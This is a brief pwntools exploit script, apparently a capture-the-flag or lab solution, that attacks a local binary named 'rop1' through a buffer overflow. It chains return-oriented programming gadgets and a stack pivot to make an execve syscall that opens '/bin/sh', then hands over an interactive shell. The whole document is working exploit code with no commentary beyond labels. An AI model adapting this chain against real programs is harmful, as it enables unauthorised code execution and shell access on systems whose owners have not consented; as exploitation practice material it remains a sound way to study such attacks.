from pwn import *
context.arch='amd64'
r=process('./rop1')

# gadgets
shell=(0x006c9eb8+0x006cd548)//2
pop_rax_rdx_rbx_ret=0x478616
pop_rdi_ret=0x401516
pop_rsi_ret=0x401637
padding=b'a'*40
read=0x43f4b0
syscall=0x4003da
func1=0x4009ae
leave=0x4009e4
main=0x4009e6
bof2=0x6ccd60

# exploit
payload1=flat(1004120, pop_rax_rdx_rbx_ret, 0x3b, 0, 0, pop_rdi_ret, bof2+10*0x8, pop_rsi_ret, 0, syscall, b'/bin/sh\x00')
r.sendline(payload1)
payload2=b'rahwhale'*4+flat(bof2, leave)
r.sendline(payload2)
r.interactive()
